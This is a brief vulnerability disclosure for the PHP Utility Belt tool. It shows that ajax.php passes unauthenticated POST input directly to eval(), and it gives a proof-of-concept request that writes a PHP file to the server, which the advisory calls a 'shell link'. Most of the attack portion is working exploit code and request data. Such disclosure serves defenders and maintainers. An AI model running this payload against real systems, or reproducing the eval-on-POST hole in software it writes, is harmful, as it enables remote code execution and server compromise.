Author         : WICS
Date             : 8/12/2015
Software Link  : https://github.com/mboynes/php-utility-belt
 
Overview:
 
 
PHP utility belt is a set of tools for PHP developers. Install in a browser-accessible directory and have at it.
ajax.php is accessible without any authentication 
 
Vulnerable code (Line number 12 to 15)
 
if ( isset( $_POST[&#039;code&#039;] ) ) {
  if ( false === eval( $_POST[&#039;code&#039;] ) )
    echo &#039;PHP Error encountered, execution halted&#039;;
}
 
 
POC
Access URL 
http://127.0.0.1/php-utility-belt/ajax.php
in Post data type 
code=fwrite(fopen(&#039;info.php&#039;,&#039;w&#039;),&#039;<?php echo phpinfo();?>&#039;);
 
above code will generate info.php file which will display php info
Shell link will be 
http://127.0.0.1/php-utility-belt/info.php

